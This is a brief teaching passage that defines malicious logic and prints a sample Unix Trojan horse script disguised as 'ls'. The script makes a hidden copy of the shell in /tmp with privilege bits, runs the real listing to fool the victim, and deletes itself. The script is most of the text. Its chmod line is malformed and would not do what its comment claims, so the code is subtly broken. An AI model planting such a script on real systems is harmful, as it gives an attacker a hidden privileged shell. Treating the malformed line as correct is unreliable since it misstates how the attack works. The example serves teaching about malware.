### Definition [^fn1]

Malicious logic, more commonly called malware, is a set of instructions that cause a site’s security policy to be violated.

Following is a demonstration of a malicious code in Unix based systems
~~~
#! /bin/sh 

# make a privileged, hidden copy of the shell (command interpreter) 
cp /bin/sh /tmp/.xxsh 
chmod o+s, w+x /tmp/.xxsh

# do what the victim thinks is *all* you’re doing 
ls $* 

# delete this file 
rm ./ls
~~~
